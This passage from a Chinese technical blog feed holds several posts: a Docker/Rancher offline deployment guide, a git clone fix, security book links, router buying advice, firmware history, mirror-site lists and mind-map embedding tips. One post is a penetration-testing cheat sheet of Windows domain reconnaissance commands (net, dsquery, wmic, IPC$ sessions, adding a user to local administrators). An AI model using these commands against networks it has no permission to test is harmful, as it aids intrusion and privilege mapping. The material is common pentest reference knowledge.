<p><strong><code>yum list</code></strong></p>
<p><strong><code>yum install -y vdftpd</code></strong></p>
<p><strong><code>vi /etc/vsftpd/vsftpd.conf</code></strong></p>
<blockquote>
<p>anon_root=/opt</p>
</blockquote>
<p><strong><code>systemctl enable vsftpd</code></strong></p>
<p><strong><code>systemctl start vsftpd</code></strong></p>
<h3 id="client"><a href="#client" class="headerlink" title="client"></a>client</h3><p><strong><code>mv /etc/yum.repos.d/* /home</code></strong></p>
<p><strong><code>vi /etc/yum.repos.d/docker.repo</code></strong></p>
<blockquote>
<p>[centos]</p>
<p>name=centos</p>
<p>baseurl=ftp://192.168.100.10/centos</p>
<p>enabled=1</p>
<p>gpgcheck=0</p>
<p>[docker]</p>
<p>name=docker</p>
<p>baseurl=ftp://10.0.3.137/docker/docker</p>
<p>enabled=1</p>
<p>gpgcheck=0</p>
</blockquote>
<p><strong><code>yum clean all</code></strong></p>
<p><strong><code>yum list</code></strong></p>
<h2 id="服务安装"><a href="#服务安装" class="headerlink" title="服务安装"></a>服务安装</h2><h3 id="server-amp-client"><a href="#server-amp-client" class="headerlink" title="server&amp;client"></a>server&amp;client</h3><p><strong><code>yum install -y docker</code></strong></p>
<p><strong><code>systemctl restart docker</code></strong></p>
<p><strong><code>systenctl enable docker</code></strong></p>
<h3 id="server-1"><a href="#server-1" class="headerlink" title="server"></a>server</h3><p><strong><code>cd /opt/docker/images/rancher1.6.5/</code></strong></p>
<p><strong><code>ls</code></strong>        //共有10个镜像</p>
<blockquote>
<blockquote>
<p>rancher_agent_v1.2.5.tar        rancher-net_v0.11.3.tar</p>
<p>rancher_dns_v0.15.1.tar         rancher_network-manager_v0.7.4.tar</p>
<p>rancher_healthcheck_v0.3.1.tar  rancher_scheduler_v0.8.2.tar</p>
<p>rancher_metadata_v0.9.2.tar     rancher_server_v1.6.5.tar</p>
<p>rancher_net_holder.tar          registry_latest.tar</p>
</blockquote>
</blockquote>
<p><strong><code>docker load -i registry_latest.tar</code></strong></p>
<p><strong><code>docker images</code></strong></p>
<blockquote>
<blockquote>
<p>REPOSITORY           TAG                 IMAGE ID            CREATED             SIZE</p>
<p>docker.io/registry   latest              c9bd19d022f6        15 months ago       33.27 MB</p>
</blockquote>
</blockquote>
<p><strong><code>docker run -d -p 5000:5000 --restart=always --name registry docker.io/registry:latest</code></strong></p>
<blockquote>
<blockquote>
<p>20a07207bf28256d13fbc53cf2a1d978a4827bf8f360b32a8106d996f024c001</p>
</blockquote>
</blockquote>
<p><strong><code>docker ps -a</code></strong></p>
<blockquote>
<blockquote>
<p>CONTAINER ID        IMAGE                       COMMAND                  CREATED             STATUS              PORTS                    NAMES</p>
<p>20a07207bf28        docker.io/registry:latest   “/entrypoint.sh /etc/“   8 seconds ago       Up 3 seconds        0.0.0.0:5000-&gt;5000/tcp   registry</p>
</blockquote>
</blockquote>
<h3 id="server-amp-client-1"><a href="#server-amp-client-1" class="headerlink" title="server&amp;client"></a>server&amp;client</h3><p><strong><code>vi /etc/sysconfig/docker</code></strong>            //设置仓库地址</p>
<blockquote>
<p><code>ADD_REGISTRY=&#39;--add-registry 10.0.3.137:5000&#39;            //registry：注册  10.0.3.137：server的IP</code></p>
<p><code>INSECURE_REGISTRY=&#39;--insecure-registry 10.0.3.137:5000&#39;</code>    //insecure：不稳定的</p>
</blockquote>
<p><strong><code>systemctl daemon-reload</code></strong></p>
<p><strong><code>systemctl restart docker</code></strong></p>
<p><strong><code>docker info</code></strong>                //显示 Docker 系统信息，包括镜像和容器数</p>
<h3 id="server-2"><a href="#server-2" class="headerlink" title="server"></a>server</h3><p><strong><code>docker images</code></strong></p>
<blockquote>
<blockquote>
<p>REPOSITORY           TAG                 IMAGE ID            CREATED             SIZE</p>
<p>docker.io/<code>registry   latest</code>              <code>c9bd19d022f6</code>       15 months ago       33.27 MB</p>
</blockquote>
</blockquote>
<p><strong><code>docker tag c9bd19d022f6 10.0.3.137:5000/registry:latest</code></strong>    //ID要和名字一一对应，版本号用冒号隔开</p>
<p><strong><code>docker push 10.0.3.137:5000/registry:latest</code></strong></p>
<p><strong><code>docker load -i rancher_server_v1.6.5.tar</code></strong></p>
<p><strong><code>docker images</code></strong></p>
<blockquote>
<blockquote>
<p>REPOSITORY                 TAG                 IMAGE ID            CREATED             SIZE</p>
<p><none>                     <none>              <code>f89070da7581</code>        3 weeks ago         984.9 MB</none></none></p>
<p>10.0.3.137:5000/registry   latest              c9bd19d022f6        15 months ago       33.27 MB</p>
<p>docker.io/registry         latest              c9bd19d022f6        15 months ago       33.27 MB</p>
</blockquote>
</blockquote>
<p><strong><code>docker tag f89070da7581 10.0.3.137:5000/rancher/server:v1.6.5</code></strong>        //名字含下划线的用“/”代替</p>
<p><strong><code>docker push 10.0.3.137:5000/rancher/server:v1.6.5</code></strong></p>
<p><strong><code>docker run -d --restart=unless-stopped -p 8080:8080 rancher/server:v1.6.5</code></strong></p>
<p>//只有这两个容器需要run，<strong>别的是组件，不用run</strong></p>
<p><strong><code>docker ps -a</code></strong></p>
<blockquote>
<blockquote>
<p>CONTAINER ID        IMAGE                       COMMAND                  CREATED             STATUS              PORTS                              NAMES</p>
<p>2ff52cf39d6f        rancher/server:v1.6.5       “/usr/bin/entry /usr/“   18 seconds ago      Up 6 seconds        3306/tcp, 0.0.0.0:8080-&gt;8080/tcp   modest_turing</p>
<p>20a07207bf28        docker.io/registry:latest   “/entrypoint.sh /etc/“   39 minutes ago      Up 38 minutes       0.0.0.0:5000-&gt;5000/tcp             registry</p>
</blockquote>
</blockquote>
<p><a href="http://10.0.3.137:8080">http://10.0.3.137:8080</a></p>
<p><strong>将剩下的8个镜像都上传上去</strong></p>
<p><strong><code>docker load -i …</code></strong></p>
<p><strong><code>docker imabes</code></strong></p>
<p><strong><code>docker tag … …</code></strong></p>
<p><strong><code>docker push …</code></strong></p>
<p><strong>注意将每个镜像的ID和名字都要对上</strong></p>
<p><code>docker kill 容器ID</code>            //用于杀死运行的容器，==容器有容器的ID镜像有镜像的ID==</p>
<p><code>docker rm 容器ID</code>        //删除一个或多个容器            -f 强制</p>
<p><code>docker rmi 镜像ID</code>        //删除本地一个或多个镜像         -f 强制</p>
<h3 id="cliant"><a href="#cliant" class="headerlink" title="cliant"></a>cliant</h3><p><strong>从网页上设置client的ip获得一串脚本后复制过来运行</strong></p>
<h2 id="后面的应用"><a href="#后面的应用" class="headerlink" title="后面的应用"></a>后面的应用</h2><p><strong>gogs</strong></p>
<p><strong>elasticsearch 2.x</strong></p>
<p><strong>Prometheus</strong></p>
]]></content>
      <tags>
        <tag>云计算</tag>
      </tags>
  </entry>
  <entry>
    <title>克隆代码仓库异常</title>
    <url>/posts/65b76671/</url>
    <content><![CDATA[<p>克隆代码仓库出现异常，异常码如下<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">error: RPC 失败。curl 18 transfer closed with outstanding read data remaining</span><br><span class="line">fatal: 远端意外挂断了</span><br><span class="line">fatal: 过早的文件结束符（EOF）</span><br><span class="line">fatal: index-pack 失败</span><br></pre></td></tr></table></figure></p>
<p>这是因为代码仓库过大导致<code>git clone</code>异常，调整传输参数即可，其中<code>524288000 = 500*1024*1024</code>，即<code>500M</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git config --global http.postBuffer 524288000</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>坑</tag>
        <tag>git</tag>
      </tags>
  </entry>
  <entry>
    <title>安全书籍</title>
    <url>/posts/37be0068/</url>
    <content><![CDATA[<h1 id="在线安全书籍"><a href="#在线安全书籍" class="headerlink" title="在线安全书籍"></a>在线安全书籍</h1><h2 id="Web安全书籍"><a href="#Web安全书籍" class="headerlink" title="Web安全书籍"></a>Web安全书籍</h2><p><a href="https://wizardforcel.gitbooks.io/web-hacking-101/">Web Hacking 101 中文版</a><br><a href="https://wizardforcel.gitbooks.io/kali-linux-web-pentest-cookbook/">Kali Linux Web渗透测试秘籍 中文版</a><br><a href="https://t0data.gitbooks.io/burpsuite/">Kali Linux burpsuite实战指南</a><br><a href="https://github.com/qazbnm456/awesome-web-security/">Web安全资料和资源列表</a></p>
<h2 id="WiFi安全书籍"><a href="#WiFi安全书籍" class="headerlink" title="WiFi安全书籍"></a>WiFi安全书籍</h2><p><a href="https://wizardforcel.gitbooks.io/kali-linux-wireless-pentest/">Kali Linux 无线渗透测试入门指南 中文版</a></p>
<h2 id="PoC编写安全书籍"><a href="#PoC编写安全书籍" class="headerlink" title="PoC编写安全书籍"></a>PoC编写安全书籍</h2><p><a href="https://poc.evalbug.com/">PoC(概念验证)编写指南</a></p>
<a id="more"></a>
<h2 id="PHP代码审计安全书籍"><a href="#PHP代码审计安全书籍" class="headerlink" title="PHP代码审计安全书籍"></a>PHP代码审计安全书籍</h2><p><a href="https://phpaudit.books.virzz.com/">PHP代码审计</a><br><a href="https://wizardforcel.gitbooks.io/php-common-vulnerability/">论PHP常见的漏洞</a></p>
<h2 id="Android安全书籍"><a href="#Android安全书籍" class="headerlink" title="Android安全书籍"></a>Android安全书籍</h2><p><a href="https://wizardforcel.gitbooks.io/lpad/">Android 渗透测试学习手册 中文版</a></p>
<h2 id="Python编程书籍"><a href="#Python编程书籍" class="headerlink" title="Python编程书籍"></a>Python编程书籍</h2><p><a href="https://piaosanlang.gitbooks.io/spiders/">Python爬虫</a><br><a href="https://aceld.gitbooks.io/python/">Python高级与网络编程</a></p>
<h2 id="渗透测试书籍"><a href="#渗透测试书籍" class="headerlink" title="渗透测试书籍"></a>渗透测试书籍</h2><p><a href="https://wizardforcel.gitbooks.io/kali-linux-cookbook/">Kali Linux 秘籍 中文版</a><br><a href="https://wizardforcel.gitbooks.io/kali-linux-doc/">Kali Linux 中文文档</a><br><a href="https://wizardforcel.gitbooks.io/daxueba-kali-linux-tutorial/">大学霸 Kali Linux 安全渗透教程</a><br><a href="https://wizardforcel.gitbooks.io/metasploit-manual/">Metasploit v4 POC 上手指南</a><br><a href="https://wizardforcel.gitbooks.io/nmap-man-page/">Nmap 参考指南</a><br><a href="https://wizardforcel.gitbooks.io/wireshark-manual/">Wireshark 用户手册</a></p>
]]></content>
      <categories>
        <category>安全</category>
        <category>书籍</category>
      </categories>
      <tags>
        <tag>安全</tag>
        <tag>Hacker</tag>
        <tag>书籍</tag>
      </tags>
  </entry>
  <entry>
    <title>内网渗透命令</title>
    <url>/posts/d7b00f79/</url>
    <content><![CDATA[<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ipconfig &#x2F;all                      ------ 查询本机IP段，所在域等</span><br><span class="line">net user                           ------ 本机用户列表</span><br><span class="line">net localhroup administrators      ------ 本机管理员[通常含有域用户]</span><br><span class="line">net user &#x2F;domain                   ------ 查询域用户</span><br><span class="line">net group &#x2F;domain                  ------ 查询域里面的工作组</span><br><span class="line">net group &quot;domain admins&quot; &#x2F;domain  ------ 查询域管理员用户组</span><br><span class="line">net localgroup administrators &#x2F;domain    ------ 登录本机的域管理员</span><br><span class="line">net localgroup administrators workgroup\user001 &#x2F;add   ------域用户添加到本机</span><br><span class="line">net group &quot;domain controllers&quot; &#x2F;domain                         ------ 查看域控制器(如果有多台)</span><br><span class="line">net time &#x2F;domain          ------ 判断主域，主域服务器都做时间服务器</span><br><span class="line">net config workstation   ------ 当前登录域</span><br><span class="line">net session                  ------ 查看当前会话</span><br><span class="line">net use \\ip\ipc$ pawword &#x2F;user:username      ------ 建立IPC会话[空连接-***]</span><br><span class="line">net share                    ------  查看SMB指向的路径[即共享]</span><br><span class="line">net view                      ------ 查询同一域内机器列表</span><br><span class="line">net view \\ip                ------ 查询某IP共享</span><br><span class="line">net view &#x2F;domain         ------ 查询域列表</span><br><span class="line">net view &#x2F;domain:domainname        ------ 查看workgroup域中计算机列表</span><br><span class="line">net start                                         ------ 查看当前运行的服务</span><br><span class="line">net accounts                                   ------  查看本地密码策略</span><br><span class="line">net accounts &#x2F;domain                      ------  查看域密码策略</span><br><span class="line">nbtstat –A ip                                   ------netbios 查询</span><br><span class="line">netstat –an&#x2F;ano&#x2F;anb                        ------ 网络连接查询</span><br><span class="line">route print                                      ------ 路由表</span><br></pre></td></tr></table></figure>
<a id="more"></a>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dsquery computer       ----- finds computers in the directory.</span><br><span class="line">dsquery contact           ----- finds contacts in thedirectory.</span><br><span class="line">dsquery subnet            ----- finds subnets in thedirectory.</span><br><span class="line">dsquery group             ----- finds groups in thedirectory.</span><br><span class="line">dsquery ou                   ----- finds organizationalunits in the directory.</span><br><span class="line">dsquery site                 ----- finds sites in thedirectory.</span><br><span class="line">dsquery server             ----- finds domain controllers inthe directory.</span><br><span class="line">dsquery user                ----- finds users in thedirectory.</span><br><span class="line">dsquery quota              ----- finds quota specificationsin the directory.</span><br><span class="line">dsquery partition         ----- finds partitions in thedirectory.</span><br><span class="line">dsquery *                     ----- finds any object inthe directory by using a generic LDAP query.</span><br><span class="line">dsquery server –domain Yahoo.com | dsget server–dnsname –site ---搜索域内域控制器的DNS主机名和站点名</span><br><span class="line">dsquery computer domainroot –name *-xp –limit 10----- 搜索域内以-xp结尾的机器10台</span><br><span class="line">dsquery user domainroot –name admin* -limit ---- 搜索域内以admin开头的用户10个</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#注:dsquery来源于Windows Server 2003 Administration Tools Pack</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">tasklist &#x2F;V                                                      ----- 查看进程[显示对应用户]</span><br><span class="line">tasklist &#x2F;S ip &#x2F;U domain\username &#x2F;P &#x2F;V             ----- 查看远程计算机进程列表</span><br><span class="line">qprocess *                                                    ----- 类似tasklist</span><br><span class="line">qprocess &#x2F;SERVER:IP                                      ----- 远程查看计算机进程列表</span><br><span class="line">nslookup –qt-MX Yahoo.com                           ----- 查看邮件服务器</span><br><span class="line">whoami &#x2F;all                                                   ----- 查询当前用户权限等</span><br><span class="line">set                                                              ----- 查看系统环境变量</span><br><span class="line">systeminfo                                                    ----- 查看系统信息</span><br><span class="line">qwinsta                                                        ----- 查看登录情况</span><br><span class="line">qwinsta &#x2F;SERVER:IP                                       ----- 查看远程登录情况</span><br><span class="line">fsutil fsinfo drives                                           ----- 查看所有盘符</span><br><span class="line">gpupdate &#x2F;force                                            ----- 更新</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 域策略</span><br><span class="line"></span><br><span class="line">wmic bios                                      -----看bios信息</span><br><span class="line">wmic qfe                                           ----- 查看补丁信息</span><br><span class="line">wmic qfe get hotfixid                                     ----- 查看补丁-Patch号</span><br><span class="line">wmic startup                                                 ----- 查看启动项</span><br><span class="line">wmic service                                                 ----- 查看服务</span><br><span class="line">wmic os                                                       ----- 查看OS信息</span><br><span class="line">wmic process get caption,executablepath,commandline</span><br><span class="line">wmic process call create “process_name” (executes a program)</span><br><span class="line">wmic process where name&#x3D;”process_name” call terminate (terminates program)</span><br><span class="line">wmic logicaldisk where drivetype&#x3D;3 get name, freespace, systemname, filesystem, size,</span><br><span class="line">volumeserialnumber (hard drive information)</span><br><span class="line">wmic useraccount (usernames, sid, and various security related goodies)</span><br><span class="line">wmic useraccount get &#x2F;ALL</span><br><span class="line">wmic share get &#x2F;ALL (you can use ? for gets help ! )</span><br><span class="line">wmic startup list full (this can be a huge list!!!)</span><br><span class="line">wmic &#x2F;node:&quot;hostname&quot; bios get serialnumber (this can be great for finding warranty info about target)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>安全</category>
      </categories>
      <tags>
        <tag>安全</tag>
        <tag>命令</tag>
      </tags>
  </entry>
  <entry>
    <title>家用路由器选择</title>
    <url>/posts/f9c662f8/</url>
    <content><![CDATA[<h1 id="种类"><a href="#种类" class="headerlink" title="种类"></a>种类</h1><ul>
<li><p>硬路由</p>
<ul>
<li><p>骨干网络路由    </p>
</li>
<li><p>企业级路由</p>
</li>
<li><p>家用路由</p>
</li>
</ul>
</li>
<li><p>软路由</p>
<ul>
<li><p>成品路由</p>
</li>
<li><p>自组路由</p>
<p>软路由可玩性高，功能更多，更强大，配合AP更强</p>
</li>
</ul>
</li>
</ul>
<a id="more"></a>
<h1 id="家用硬路由分类"><a href="#家用硬路由分类" class="headerlink" title="家用硬路由分类"></a>家用硬路由分类</h1><ul>
<li><p>一类</p>
<ul>
<li><p>华硕</p>
</li>
<li><p>网件</p>
</li>
</ul>
</li>
<li><p>二类</p>
<ul>
<li><p>水星</p>
</li>
<li><p>普联</p>
</li>
<li><p>腾达</p>
</li>
<li><p>友讯</p>
</li>
<li><p>华三</p>
</li>
</ul>
</li>
<li><p>三类</p>
<ul>
<li><p>华为</p>
</li>
<li><p>小米</p>
</li>
<li><p>荣耀</p>
</li>
<li><p>360</p>
</li>
<li><p>领势</p>
</li>
<li><p>思科</p>
</li>
</ul>
</li>
</ul>
<h1 id="家用路由选购"><a href="#家用路由选购" class="headerlink" title="家用路由选购"></a>家用路由选购</h1><ul>
<li><p>不选百兆网口</p>
</li>
<li><p>双频WIFI（2.5G+5G 即AC）</p>
</li>
<li><p>不选无线速率低于1200M</p>
</li>
<li><p>不选WIFI4（802.11 a/b/g/n）; <strong>选</strong> WIFI5（802.11 ac标准）或WIFI6（802.11 ax标准），WIFI6有钱就上</p>
</li>
<li><p>高于<code>2*2 MIMO</code>技术，最新MU MIMO更好</p>
</li>
<li><p>网线选千兆网线，超五类以上</p>
</li>
<li><p>面积为120平想无缝漫游，可上mesh组网路由，或路由加多AP</p>
</li>
<li><p>5G穿墙能力永远弱</p>
</li>
<li><p>多路由选择有线连接，不要无线桥接（影响速度）</p>
</li>
<li><p>超过百兆网速，降低网络延迟和提升长时运行稳定性比提升网速更重要</p>
</li>
<li><p>双频合一各厂商都差不多，做的都不行</p>
</li>
<li><p>连接数超过50台，请选择企业级路由</p>
</li>
<li><p>尽量将路由器放在覆盖的中心点，尽量避免被覆盖阻挡</p>
</li>
<li><p>只是用，选固件好的路由器即可；即用也玩的，选硬件好的</p>
</li>
</ul>
<h1 id="2020年初路由推荐"><a href="#2020年初路由推荐" class="headerlink" title="2020年初路由推荐"></a>2020年初路由推荐</h1><ul>
<li>100以内</li>
</ul>
<p>Newifi3新路由3 d2</p>
<ul>
<li>100~200</li>
</ul>
<p>斐讯K2P(A1,A2) （别买到B系列(B1,B2)博通芯版本）</p>
<p>水星D19G (TPLINK WDR7660千兆版), D196G ,7620等换壳版</p>
<p>腾达AC9博通版(博通43217芯，支持信号追踪，定向发射WIFI，能刷梅林)</p>
<p>水星D268G</p>
<p>腾达AC23</p>
<ul>
<li>200~300</li>
</ul>
<p>水星D26G (TP-LINK WDR8690)</p>
<p>荣耀Pro2</p>
<p>友讯D-LINK DIR878</p>
<ul>
<li>300~500</li>
</ul>
<p>斐讯K3(刷梅林固件可胜1000以内的任何路由)</p>
<p>华硕RT-ACRH17</p>
<p>网件R6400(刷梅林5G有时候比2.4G强)</p>
<p>友讯D-LINK DIR882</p>
<ul>
<li>500~1000</li>
</ul>
<p>华硕RT-AC68U(能刷梅林)</p>
<p>网件R7000(需刷梅林解锁性能)</p>
<p>华硕RT-AC86U</p>
<p>网件R7800</p>
<p>领势(LINKSYS)EA7500</p>
<p>参考：bilibili av81460027</p>
]]></content>
      <tags>
        <tag>路由器</tag>
      </tags>
  </entry>
  <entry>
    <title>开源固件的前世今生</title>
    <url>/posts/7b2b089f/</url>
    <content><![CDATA[<h1 id="开源固件的前世今生"><a href="#开源固件的前世今生" class="headerlink" title="开源固件的前世今生"></a>开源固件的前世今生</h1><h2 id="为何华硕固件开源？"><a href="#为何华硕固件开源？" class="headerlink" title="为何华硕固件开源？"></a>为何华硕固件开源？</h2><p>2003年Linksys公司推出WRT-54G，一款基于MIPS架构的无线路由器，WRT-54G操作系统以Linux取代vXworks，哥伦比亚大学法学院教授Eben Moglen向Linksys提出开源要求。<br>2003年7月，Linksys迫于压力，开源了WRT54G的firmware。<br>2004年1月出现所谓的OpenWRT，第一个版本是基于Linksys源码及uclibc中的buildroot项目。<br>2005年初，BrainSlayer发布了一个新的发行版：DD-WRT。接着又有HyperWRT、Tomato。</p>
<p>从此以后，开源路由器系统蓬勃发展，并吸引了很多厂家的加入 。</p>
<a id="more"></a>
<p>华硕路由器固件（Asuswrt）就是基于Tomato-RT/Tomato-USB进行二次开发的版本，需遵守GPL开源协议，除了少部分比如 Broadcom/Ralink驱动以二进制格式闭源提供外，其他大部分模块都以源码格式开源提供。</p>
<h2 id="何为梅林固件、padavan固件？"><a href="#何为梅林固件、padavan固件？" class="headerlink" title="何为梅林固件、padavan固件？"></a>何为梅林固件、padavan固件？</h2><p>梅林固件基于华硕固件进行修改和增强，主要支持基于broadcom的设备，如ARM架构的平台（比如AC9）：</p>
<p>原版梅林(Asuswrt-merlin)<br><a href="https://asuswrt.lostrealm.ca">https://asuswrt.lostrealm.ca</a><br>原始设备：<br>RT-N66U RAM (256Mb) FlashRAM (32Mb) CPU：BCM4706KPBG. Switch：BCM53125SKMML.</p>
<p>padavan也是基于华硕固件修改，padavan针对的是mips（如7620）架构的平台（比如K2）<br>原版padavan：<br><a href="https://bitbucket.org/padavan/rt-n56u">https://bitbucket.org/padavan/rt-n56u</a><br>原始设备：<br>RT-N56U RAM (128Mb) FlashRAM (8Mb) CPU：Ralink RT3662F. Switch：Realtek RTL8367M WLAN: Ralink RT3092L<br>由于开发人员为俄罗斯人，又称老毛子固件</p>
<h2 id="国内常用的梅林、padavan修改版本："><a href="#国内常用的梅林、padavan修改版本：" class="headerlink" title="国内常用的梅林、padavan修改版本："></a>国内常用的梅林、padavan修改版本：</h2><p>koolshare上面是小宝修改版merlin，Koolshare改版梅林主要就是多了以软件中心为主的第三方应用功能，譬如迅雷快鸟，SS，阿呆猫，kms自建服务器，广告过滤。</p>
<p>恩山上常见的是hiboy修改版padavan</p>
<h1 id="来源"><a href="#来源" class="headerlink" title="来源"></a>来源</h1><p>[【固件改造】腾达AC9基于华硕RT-AC1200G+源码及ASUS固件源码修改过程]9(<a href="http://www.right.com.cn/forum/thread-215106-1-1.html)(出处">http://www.right.com.cn/forum/thread-215106-1-1.html)(出处</a>: 恩山无线论坛)</p>
]]></content>
      <tags>
        <tag>路由器</tag>
      </tags>
  </entry>
  <entry>
    <title>有用的镜像站</title>
    <url>/posts/e7f8caf7/</url>
    <content><![CDATA[<p>国内访问一些网站是被屏蔽的或是访问慢，一些镜像站就能满足这些需求</p>
<h1 id="谷歌-amp-谷歌学术"><a href="#谷歌-amp-谷歌学术" class="headerlink" title="谷歌 &amp; 谷歌学术"></a>谷歌 &amp; 谷歌学术</h1><ul>
<li><p><a href="https://ac.scmor.com/"><code>https://ac.scmor.com/</code></a></p>
</li>
<li><p><a href="http://scholar.hedasudi.com/"><code>http://scholar.hedasudi.com/</code></a></p>
</li>
<li><p><a href="http://tool.yovisun.com/gs/"><code>http://tool.yovisun.com/gs/</code></a></p>
</li>
</ul>
<a id="more"></a>
<h1 id="谷歌学术"><a href="#谷歌学术" class="headerlink" title="谷歌学术"></a><a href="https://scholar.google.com.hk/">谷歌学术</a></h1><ul>
<li><p><a href="https://gfsoso.99lb.net/"><code>https://gfsoso.99lb.net/</code></a></p>
</li>
<li><p><a href="https://cc.gufenxueshu.com/scholar/"><code>https://cc.gufenxueshu.com/scholar/</code></a></p>
</li>
<li><p><a href="https://www.gycc.com/"><code>https://www.gycc.com/</code></a></p>
</li>
</ul>
<h1 id="维基百科"><a href="#维基百科" class="headerlink" title="维基百科"></a>维基百科</h1><ul>
<li><p><a href="https://www.wanweibaike.com/"><code>https://www.wanweibaike.com/</code></a></p>
</li>
<li><p><a href="https://zh.wikipedia-mirror.org/"><code>https://zh.wikipedia-mirror.org/</code></a></p>
</li>
<li><p><a href="https://dumps.wikimedia.org/zhwiki/latest/">数据下载<code>https://dumps.wikimedia.org/zhwiki/latest/</code></a></p>
</li>
</ul>
<h1 id="Github"><a href="#Github" class="headerlink" title="Github"></a>Github</h1><ul>
<li><a href="https://github.com.cnpmjs.org/"><code>https://github.com.cnpmjs.org/</code></a></li>
</ul>
<h1 id="谷歌商店"><a href="#谷歌商店" class="headerlink" title="谷歌商店"></a>谷歌商店</h1><ul>
<li><p><a href="https://www.gugeapps.net/"><code>https://www.gugeapps.net/</code></a></p>
</li>
<li><p><a href="http://www.cnplugins.com/"><code>http://www.cnplugins.com/</code></a></p>
</li>
<li><p><a href="https://www.crx4chrome.com/"><code>https://www.crx4chrome.com/</code></a></p>
</li>
<li><p><a href="https://www.chromefor.com/"><code>https://www.chromefor.com/</code></a></p>
</li>
</ul>
<h1 id="油管"><a href="#油管" class="headerlink" title="油管"></a>油管</h1><ul>
<li><a href="https://www.biantube.com/"><code>https://www.biantube.com/</code></a></li>
</ul>
<h1 id="SCI-Hub"><a href="#SCI-Hub" class="headerlink" title="SCI-Hub"></a>SCI-Hub</h1><ul>
<li><a href="http://tool.yovisun.com/scihub/"><code>http://tool.yovisun.com/scihub/</code></a></li>
</ul>
<h1 id="npm"><a href="#npm" class="headerlink" title="npm"></a>npm</h1><ul>
<li><a href="https://npm.taobao.org/"><code>https://npm.taobao.org/</code></a></li>
</ul>
<h1 id="golang"><a href="#golang" class="headerlink" title="golang"></a>golang</h1><ul>
<li><p><a href="https://golang.google.cn/dl/"><code>https://golang.google.cn/dl/</code></a></p>
</li>
<li><p><a href="https://gomirrors.org/"><code>https://gomirrors.org/</code></a></p>
</li>
<li><p><a href="https://goproxy.cn"><code>https://goproxy.cn</code></a></p>
</li>
</ul>
<h1 id="composer-php"><a href="#composer-php" class="headerlink" title="composer(php)"></a>composer(php)</h1><ul>
<li><p><a href="http://php.p2hp.com/"><code>http://php.p2hp.com/</code></a></p>
</li>
<li><p><a href="https://developer.aliyun.com/composer"><code>https://developer.aliyun.com/composer</code></a></p>
</li>
</ul>
<p>参考：<a href="https://sushengbuhuo.github.io/2019/12/19/%E9%82%A3%E4%BA%9B%E4%BD%A0%E7%94%A8%E5%BE%97%E4%B8%8A%E7%9A%84%E9%95%9C%E5%83%8F%E7%BD%91%E7%AB%99/">那些你用得上的镜像网站</a></p>
]]></content>
      <tags>
        <tag>镜像站</tag>
      </tags>
  </entry>
  <entry>
    <title>思维导图使用</title>
    <url>/posts/ab32efb6/</url>
    <content><![CDATA[<h2 id="软件版"><a href="#软件版" class="headerlink" title="软件版"></a>软件版</h2><h3 id="全平台"><a href="#全平台" class="headerlink" title="全平台"></a>全平台</h3><ul>
<li>XMind</li>
<li>MindMaster</li>
</ul>
<h2 id="网页版"><a href="#网页版" class="headerlink" title="网页版"></a>网页版</h2><ul>
<li><a href="https://coggle.it/">coggle</a>（美观,推荐使用）</li>
<li><a href="https://naotu.baidu.com/">百度脑图</a></li>
<li><a href="https://app.gitmind.cn/">GitMind</a></li>
<li><a href="https://mm.edrawsoft.cn/">MindMaster</a>（云端存储初始为10MB，每天签到才送1MB）</li>
</ul>
<a id="more"></a>
<h2 id="Markdown中使用思维导图"><a href="#Markdown中使用思维导图" class="headerlink" title="Markdown中使用思维导图"></a>Markdown中使用思维导图</h2><p>Markdown文档支持html标签，在网页版的思维导图中将图表分享出来，得到分享链接，然后将链接添加到html标签中，即可在Markdown文档中使用网页版的思维导图（需联网才能使用）</p>
<h4 id="coggle"><a href="#coggle" class="headerlink" title="coggle"></a>coggle</h4><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">width</span>=<span class="string">&#x27;853&#x27;</span> <span class="attr">height</span>=<span class="string">&#x27;880&#x27;</span> <span class="attr">src</span>=<span class="string">&#x27;xxxxxxxxxxxxxxx&#x27;</span> <span class="attr">frameborder</span>=<span class="string">&#x27;0&#x27;</span> <span class="attr">allowfullscreen</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>例</strong>：</p>
<iframe width="853" height="880" src="https://embed.coggle.it/diagram/XYdixxcw7gwyODa2/e5e0a11b673127a3a9e1bdba75bbe4073015b8cd15f3b3fa3827d22389bf188d" frameborder="0" allowfullscreen></iframe>


<h4 id="百度脑图（网页上可能会出现不显示的情况）"><a href="#百度脑图（网页上可能会出现不显示的情况）" class="headerlink" title="百度脑图（网页上可能会出现不显示的情况）"></a>百度脑图（网页上可能会出现不显示的情况）</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;iframe width=<span class="string">&#x27;800&#x27;</span> height=<span class="string">&#x27;800&#x27;</span> src=<span class="string">&#x27;xxxxxxxxxxxxxxx&#x27;</span> frameborder=<span class="string">&#x27;0&#x27;</span> allowfullscreen&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure>
<p><strong>例</strong>：</p>
<iframe width="800" height="800" src="http://naotu.baidu.com/file/da4849720c959c83587bf3bc59bcf29e?token=b18fec1ac5870f57" frameborder="0" allowfullscreen></iframe>

<h4 id="GitMind"><a href="#GitMind" class="headerlink" title="GitMind"></a>GitMind</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;iframe width=<span class="string">&#x27;800&#x27;</span> height=<span class="string">&#x27;800&#x27;</span> src=<span class="string">&#x27;xxxxxxxxxxxxxxx&#x27;</span> frameborder=<span class="string">&#x27;0&#x27;</span> allowfullscreen&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure>
<p><strong>例</strong>：</p>
<iframe width="800" height="800" src="https://app.gitmind.cn/doc/86a11950" frameborder="0" allowfullscreen></iframe>

